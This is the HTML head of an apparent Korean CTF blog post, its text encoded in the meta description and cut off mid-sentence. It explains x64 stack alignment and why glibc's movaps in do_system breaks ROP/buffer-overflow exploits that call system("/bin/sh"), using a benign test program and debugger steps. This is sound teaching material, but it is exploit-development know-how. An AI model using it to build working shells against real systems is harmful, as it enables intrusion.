

<!DOCTYPE html>
<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="&lt;h1 id=&#34;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&#34;&gt;&lt;a href=&#34;#&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&#34;&gt;&lt;/a&gt;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/1.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xBE44;&amp;#xBC00; &amp;#xD504;&amp;#xB85C;&amp;#xC81D;&amp;#xD2B8;( &amp;#xC544;&amp;#xC9C1; &amp;#xBE44;&amp;#xBC00;, &amp;#xC27F;! ) &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; Ubuntu 20.04&amp;#xC5D0;&amp;#xC11C; &amp;#xBA87; &amp;#xAC00;&amp;#xC9C0; &amp;#xD14C;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB97C; &amp;#xD558;&amp;#xB2E4;&amp;#xAC00; &amp;#xCC98;&amp;#xC74C; &amp;#xBCF4;&amp;#xB294; &amp;#xC5D0;&amp;#xB7EC;&amp;#xC5D0; &amp;#xB2F9;&amp;#xD669;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;do_system+364: movaps&lt;/code&gt; &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC5D0;&amp;#xC11C; Segmentation Fault&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB354;&amp;#xB77C;&amp;#xACE0;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/2.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xB2C8;&amp;#xAE4C; Ubuntu 18.04&amp;#xBD80;&amp;#xD130; &lt;code&gt;do_system()&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;movaps&lt;/code&gt;&amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC774; &amp;#xD558;&amp;#xB098; &amp;#xCD94;&amp;#xAC00;&amp;#xB410;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC870;&amp;#xAE08; &amp;#xB4A4;&amp;#xC5D0; &amp;#xC790;&amp;#xC138;&amp;#xD788; &amp;#xC124;&amp;#xBA85;&amp;#xD558;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC;, x64 &amp;#xB9AC;&amp;#xB205;&amp;#xC2A4;&amp;#xC5D0;&amp;#xC120; 16&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB85C; stack alignment&amp;#xB97C; &amp;#xC9C0;&amp;#xCF1C;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. stack alignment&amp;#xAC00; &amp;#xAE68;&amp;#xC838;&amp;#xC788;&amp;#xC73C;&amp;#xBA74; &amp;#xC774; &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB2E4; Segmentation Fault&amp;#xAC00; &amp;#xB739;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB188; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; 18.04 &amp;#xC774;&amp;#xC804; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0;&amp;#xC11C; &amp;#xC775;&amp;#xC2A4; &amp;#xB418;&amp;#xB294; BOF &amp;#xACF5;&amp;#xACA9;&amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; 18.04 &amp;#xC774;&amp;#xD6C4; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0;&amp;#xB3C4; &amp;#xC788;&amp;#xB2E4;&amp;#xACE0; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/3.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&amp;#x6545; Fabu1ous&amp;#xC758; &amp;#xB124;&amp;#xC774;&amp;#xBC84; &amp;#xBE14;&amp;#xB85C;&amp;#xADF8; (2018.10 ~ 2019.12)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC9C0;&amp;#xAE08;&amp;#xAE4C;&amp;#xC9C0; &amp;#xD47C; &amp;#xD3EC;&amp;#xB108;&amp;#xBE14; &amp;#xBB38;&amp;#xC81C;&amp;#xB9CC; &amp;#xBC31;&amp;#xBA87; &amp;#xAC1C;&amp;#xCBE4; &amp;#xB418;&amp;#xACE0; &amp;#xC218;&amp;#xC5C6;&amp;#xC774; &amp;#xB9CE;&amp;#xC740; &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD574; &amp;#xBD24;&amp;#xB294;&amp;#xB370; &amp;#xC5B4;&amp;#xC9F8;&amp;#xC11C; &amp;#xC774; &amp;#xC0AC;&amp;#xC2E4;&amp;#xC744; &amp;#xC774;&amp;#xC81C;&amp;#xC57C; &amp;#xC54C;&amp;#xAC8C; &amp;#xB41C; &amp;#xAC70;&amp;#xC9C0;?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/4.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC791;&amp;#xB144;(2019) &amp;#xD06C;&amp;#xB9AC;&amp;#xC2A4;&amp;#xB9C8;&amp;#xC2A4; CTF&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E8;&amp;#xC21C; ROP&amp;#xBB38;&amp;#xC81C;&amp;#xB97C; &amp;#xC775;&amp;#xC2A4; &amp;#xBABB;&amp;#xD574;&amp;#xC11C; &amp;#xD654;&amp;#xB0AC;&amp;#xB358; &amp;#xAE30;&amp;#xC5B5;&amp;#xC774; &amp;#xBA38;&amp;#xB9AC;&amp;#xB97C; &amp;#xC2A4;&amp;#xCE58;&amp;#xACE0; &amp;#xC9C0;&amp;#xB098;&amp;#xAC14;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBD84;&amp;#xBA85; &amp;#xB85C;&amp;#xCEEC;&amp;#xC5D0;&amp;#xC120; &amp;#xC775;&amp;#xC2A4;&amp;#xAC00; &amp;#xB418;&amp;#xB358; &amp;#xAC8C; &amp;#xB9AC;&amp;#xBAA8;&amp;#xD2B8; &amp;#xC775;&amp;#xC2A4;&amp;#xAC00; &amp;#xC548;&amp;#xB3FC;&amp;#xC11C; &amp;#xD300;&amp;#xC6D0;&amp;#xC5D0;&amp;#xAC8C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xB118;&amp;#xACA8;&amp;#xC8FC;&amp;#xACE0; &amp;#xB2E4;&amp;#xB978; &amp;#xBB38;&amp;#xC81C; &amp;#xBCF4;&amp;#xB7EC; &amp;#xAC14;&amp;#xC5C8;&amp;#xC8E0;. &amp;#xADF8;&amp;#xB54C; &amp;#xBABB; &amp;#xD480;&amp;#xC5C8;&amp;#xB358; ROP&amp;#xBB38;&amp;#xC81C;&amp;#xB294; solo_test&amp;#xB780; &amp;#xBB38;&amp;#xC81C;&amp;#xC600;&amp;#xB294;&amp;#xB370; &amp;#xADF8;&amp;#xB54C; &amp;#xB85C;&amp;#xCEEC; &amp;#xD658;&amp;#xACBD;&amp;#xC774; &amp;#xC6B0;&amp;#xBD84;&amp;#xD22C; 16.04&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xD6C4;&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&amp;#xB300;&amp;#xD68C; &amp;#xB05D;&amp;#xB098;&amp;#xACE0; &amp;#xBC14;&amp;#xB85C; &amp;#xBA70;&amp;#xCE60; &amp;#xB4A4;&amp;#xC5D0; &amp;#xC774; &amp;#xC8FC;&amp;#xC81C;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xB77C;&amp;#xC5C5;&amp;#xC774; &amp;#xD558;&amp;#xB098; &amp;#xC62C;&amp;#xB77C;&amp;#xC654;&amp;#xB294;&amp;#xB370; 1&amp;#xB144;&amp;#xC774; &amp;#xC9C0;&amp;#xB09C; &amp;#xC9C0;&amp;#xAE08;&amp;#xC5D0;&amp;#xC11C;&amp;#xC57C; &amp;#xCC3E;&amp;#xC544;&amp;#xBCF8; &amp;#xC81C; &amp;#xC790;&amp;#xC2E0;&amp;#xC774; &amp;#xB108;&amp;#xBB34; &amp;#xBC09;&amp;#xB124;&amp;#xC694;. ROP&amp;#xBB38;&amp;#xC81C;&amp;#xB77C;&amp;#xACE0; &amp;#xB300;&amp;#xC218;&amp;#xB86D;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xADF8;&amp;#xB0E5; &amp;#xB118;&amp;#xACA8;&amp;#xBC84;&amp;#xB9B0; &amp;#xAC83;&amp;#xC5D0; &amp;#xBC18;&amp;#xC131;&amp;#xD558;&amp;#xBA70; &amp;#xC9C0;&amp;#xAE08;&amp;#xC774;&amp;#xB77C;&amp;#xB3C4; &amp;#xACF5;&amp;#xBD80;&amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xB2A6;&amp;#xC5C8;&amp;#xB2E4;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD560; &amp;#xB54C;&amp;#xAC00; &amp;#xC9C4;&amp;#xC9DC; &amp;#xB108;&amp;#xBB34; &amp;#xB2A6;&amp;#xC5C8;&amp;#xB2E4; -&amp;#xBC15;&amp;#xBA85;&amp;#xC218;-&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;x64-Stack-Alignment&#34;&gt;&lt;a href=&#34;#x64-Stack-Alignment&#34; class=&#34;headerlink&#34; title=&#34;x64 Stack Alignment&#34;&gt;&lt;/a&gt;x64 Stack Alignment&lt;/h1&gt;&lt;p&gt;stack alignment&amp;#xB294; stack&amp;#xC758; top&amp;#xC774; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xB85C; &amp;#xC720;&amp;#xC9C0;&amp;#xB41C; &amp;#xC0C1;&amp;#xD0DC;&amp;#xBA70; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC758; access cycle&amp;#xC744; &amp;#xCD5C;&amp;#xC18C;&amp;#xD55C;&amp;#xC73C;&amp;#xB85C; &amp;#xC904;&amp;#xC774;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. ( CS&amp;#xB97C; &amp;#xACF5;&amp;#xBD80;&amp;#xD558;&amp;#xB2E4;&amp;#xAC00; &amp;#x201C;&amp;#xC65C;?&amp;#x201D;&amp;#xB77C;&amp;#xB294; &amp;#xC9C8;&amp;#xBB38;&amp;#xC744; &amp;#xB358;&amp;#xC9C0;&amp;#xBA74; &amp;#xC2ED;&amp;#xC911;&amp;#xD314;&amp;#xAD6C; &amp;#x201C;&amp;#xD6A8;&amp;#xC728;&amp;#x201D;&amp;#xC774;&amp;#xB77C;&amp;#xB294; &amp;#xB300;&amp;#xB2F5;&amp;#xC774; &amp;#xB3CC;&amp;#xC544;&amp;#xC634;, &amp;#xB354; &amp;#xC790;&amp;#xC138;&amp;#xD55C; &amp;#xAC74; &amp;#xC9C1;&amp;#xC811; &amp;#xCC3E;&amp;#xC544;&amp;#xBCF4;&amp;#xC2DC;&amp;#xAE38; ) &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC774; stack alignment&amp;#xB97C; &amp;#xC720;&amp;#xC9C0;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; RSP&amp;#xC758; &amp;#xC704;&amp;#xCE58;&amp;#xAC00; &amp;#xC815;&amp;#xD574;&amp;#xC9C0;&amp;#xB294; &amp;#xADDC;&amp;#xCE59;&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/5.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;Linux 64 &lt;a href=&#34;https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf&#34;&gt;ABI&lt;/a&gt;( Application binary interface )&amp;#xC5D0; &amp;#xB530;&amp;#xB974;&amp;#xBA74; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC758; &amp;#xD750;&amp;#xB984;( control )&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC758; entry&amp;#xB85C; &amp;#xC62E;&amp;#xACA8;&amp;#xC9C0;&amp;#xB294; &amp;#xC2DC;&amp;#xC810;&amp;#xC5D0;&amp;#xC120; &amp;#xC2A4;&amp;#xD0DD; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;(rsp)+8&amp;#xC774; &amp;#xD56D;&amp;#xC0C1; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xC5EC;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/6.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xBC29;&amp;#xAE08; &amp;#xC804;&amp;#xC5D4; RSP&amp;#xB97C; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xB85C; &amp;#xC720;&amp;#xC9C0;&amp;#xD558;&amp;#xB294; &amp;#xAC8C; stack alignment&amp;#xB77C; &amp;#xD574;&amp;#xB193;&amp;#xACE0; &amp;#xAC11;&amp;#xC790;&amp;#xAE30; RSP+8&amp;#xC774; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xB77C;&amp;#xB2C8;, &amp;#xBB50;&amp;#xB77C;&amp;#xB294; &amp;#xAC70;&amp;#xC57C;?&lt;/p&gt;
&lt;p&gt;&amp;#xBB34;&amp;#xC2A8; &amp;#xC18C;&amp;#xB9B0;&amp;#xC9C0; &amp;#xBAA8;&amp;#xB974;&amp;#xACA0;&amp;#xC8E0;? &amp;#xC124;&amp;#xBA85;&amp;#xC774; &amp;#xBB50; &amp;#xAC19;&amp;#xC774; &amp;#xC4F0;&amp;#xC5EC;&amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &amp;#xADF8;&amp;#xB807;&amp;#xC9C0; &amp;#xC0AC;&amp;#xC2E4; &amp;#xC544;&amp;#xC8FC; &amp;#xAC04;&amp;#xB2E8;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// test.c&lt;/span&gt;

&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;hello&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;hello stack alignment\\n&amp;quot;&lt;/span&gt;);
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
	hello();
	
	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;$ gcc -o &lt;span class=&#34;hljs-built_in&#34;&gt;test&lt;/span&gt; test.c -no-pie
$ gdb -q &lt;span class=&#34;hljs-built_in&#34;&gt;test&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC608;&amp;#xC81C;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;. &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xD560; &amp;#xB54C; &amp;#xAC70;&amp;#xC2AC;&amp;#xB9AC;&amp;#xB2C8; PIE&amp;#xB294; &amp;#xD574;&amp;#xC81C;&amp;#xD558;&amp;#xACE0; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xD558;&amp;#xC138;&amp;#xC694;. &amp;#xC800;&amp;#xB294; Ubuntu 20.04&amp;#xC640; glibc-2.31&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/7.png&#34; alt&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;pwndbg&amp;gt; bp main&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/8.png&#34; alt&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;pwndbg&amp;gt; r&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC815;&amp;#xC0C1;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;main()&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; entry point&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xC9C1; &amp;#xD504;&amp;#xB864;&amp;#xB85C;&amp;#xADF8;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xAE30; &amp;#xC804;&amp;#xC774;&amp;#xB2C8; RSP+8&amp;#xC740; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xACA0;&amp;#xC8E0;?&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7fffffffe038&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;RSP+8 : &lt;code&gt;0x7fffffffe040&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC704; &amp;#xC2A4;&amp;#xD06C;&amp;#xB9B0;&amp;#xC0F7;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; RSP+8&amp;#xC740; &lt;code&gt;0x7fffffffe040&lt;/code&gt;&amp;#xC774;&amp;#xBBC0;&amp;#xB85C; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xAC00; &amp;#xB9DE;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/9.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xB2E4;&amp;#xB4E4; &amp;#xC54C;&amp;#xB2E4;&amp;#xC2DC;&amp;#xD53C; call &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC73C;&amp;#xB85C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xBA74; stack&amp;#xC5D0; return address&amp;#xB97C; push &amp;#xD558;&amp;#xB2C8;&amp;#xAE4C; call &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xAE30; &amp;#xC9C1;&amp;#xC804;&amp;#xC5D4; RSP&amp;#xAC00; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xACA0;&amp;#xC8E0;?&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7fffffffe030&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/10.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xD568;&amp;#xC218; &amp;#xD504;&amp;#xB864;&amp;#xB85C;&amp;#xADF8;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;push rbp&lt;/code&gt;&amp;#xB97C; &amp;#xD558;&amp;#xB2C8;&amp;#xAE4C; rbp&amp;#xB294; &amp;#xD56D;&amp;#xC0C1; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xACA0;&amp;#xB124;&amp;#xC694;?&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7ffffffffdfe0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB300;&amp;#xCDA9; &amp;#xC815;&amp;#xB9AC;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; stack align&amp;#xC744; &amp;#xC9C0;&amp;#xD0A4;&amp;#xBA74;&amp;#xC11C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xD750;&amp;#xB984;&amp;#xC740; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;call &amp;#xC2E4;&amp;#xD589; &amp;#xC9C1;&amp;#xC804; RSP&amp;#xB294; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218; ( stack align O )&lt;/li&gt;
&lt;li&gt;&amp;#xD568;&amp;#xC218;&amp;#xC758; entry point&amp;#xC5D0;&amp;#xC120; RSP+8&amp;#xC774; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218; ( stack align X )&lt;/li&gt;
&lt;li&gt;&amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xD504;&amp;#xB864;&amp;#xB85C;&amp;#xADF8; &amp;#xC2E4;&amp;#xD589; &amp;#xD6C4; RSP&amp;#xB294; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218; ( stack align O )&lt;/li&gt;
&lt;li&gt;RBP&amp;#xB294; &amp;#xD56D;&amp;#xC0C1; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218; ( stack align O )&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;#xC0AC;&amp;#xC2E4;, &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD560; &amp;#xB54C; 2&amp;#xBC88; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &amp;#xC7A0;&amp;#xC2DC; stack align&amp;#xC774; &amp;#xAE68;&amp;#xC9C0;&amp;#xACE0; 3&amp;#xBC88;&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E4;&amp;#xC2DC; stack align&amp;#xC774; &amp;#xB9DE;&amp;#xCDB0;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; 2&amp;#xBC88;&amp;#xB9CC; &amp;#xB611; &amp;#xB5BC;&amp;#xC11C; &amp;#x201C;&amp;#xC774; &amp;#xAC83;&amp;#xB9CC; &amp;#xC9C0;&amp;#xD0A4;&amp;#xC2DC;&amp;#xBA74; stack align&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&amp;#x201D;&amp;#xB77C;&amp;#xACE0; &amp;#xC124;&amp;#xBA85;&amp;#xC744; &amp;#xC368;&amp;#xB194;&amp;#xC11C; &amp;#xD5F7;&amp;#xAC08;&amp;#xB9AC;&amp;#xB294; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB798;&amp;#xB3C4; &amp;#xC774;&amp;#xD574; &amp;#xC548; &amp;#xB418;&amp;#xC2DC;&amp;#xBA74; 4&amp;#xBC88;&amp;#xB9CC; &amp;#xAE30;&amp;#xC5B5;&amp;#xD558;&amp;#xC138;&amp;#xC694;. 4&amp;#xBC88;&amp;#xB9CC; &amp;#xC2E0;&amp;#xACBD; &amp;#xC368;&amp;#xC918;&amp;#xB3C4; &amp;#xACF5;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC9DC;&amp;#xB294;&amp;#xB370; &amp;#xC544;&amp;#xBB34; &amp;#xC9C0;&amp;#xC7A5;&amp;#xC774; &amp;#xC5C6;&amp;#xC744; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB354; &amp;#xC790;&amp;#xC138;&amp;#xD55C; &amp;#xC124;&amp;#xBA85;&amp;#xC740; &amp;#xC870;&amp;#xAE08; &amp;#xC774;&amp;#xB530; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;MOVAPS&#34;&gt;&lt;a href=&#34;#MOVAPS&#34; class=&#34;headerlink&#34; title=&#34;MOVAPS&#34;&gt;&lt;/a&gt;MOVAPS&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/11.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774; &amp;#xADDC;&amp;#xCE59;&amp;#xC744; &amp;#xAF2D; &amp;#xC9C0;&amp;#xCF1C;&amp;#xC57C; &amp;#xD558;&amp;#xB294;&amp;#xAC00;? &amp;#xBB3C;&amp;#xB860; &amp;#xC544;&amp;#xB2D9;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC29;&amp;#xAE08; &amp;#xC804;&amp;#xC5D0;&amp;#xB3C4; &amp;#xC124;&amp;#xBA85;&amp;#xD588;&amp;#xB4EF;&amp;#xC774; &amp;#xC720;&amp;#xC5F0;&amp;#xD558;&amp;#xAC8C; &amp;#xC5B4;&amp;#xACBC;&amp;#xB2E4;&amp;#xAC00; &amp;#xC9C0;&amp;#xCF30;&amp;#xB2E4;&amp;#xAC00; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; stack alignment&amp;#xB294; &amp;#xD6A8;&amp;#xC728;&amp;#xC744; &amp;#xB192;&amp;#xC774;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xC720;&amp;#xC9C0;&amp;#xD55C;&amp;#xB2E4;&amp;#xACE0;&amp;#xB3C4; &amp;#xC124;&amp;#xBA85;&amp;#xD588;&amp;#xB2E4;&amp;#xC2DC;&amp;#xD53C; &amp;#xC9C0;&amp;#xD0A4;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544;&amp;#xB3C4; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC774; &amp;#xB3D9;&amp;#xC791;&amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xC544;&amp;#xBB34; &amp;#xBB38;&amp;#xC81C;&amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB2E4;&amp;#xB9CC; &amp;#xD6A8;&amp;#xC728;&amp;#xC774; &amp;#xC880; &amp;#xB5A8;&amp;#xC5B4;&amp;#xC9C8; &amp;#xBFD0;&amp;#x2026; &amp;#xBB3C;&amp;#xB860; &amp;#xC608;&amp;#xC678;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xBA87;&amp;#xBA87; intel/AMD 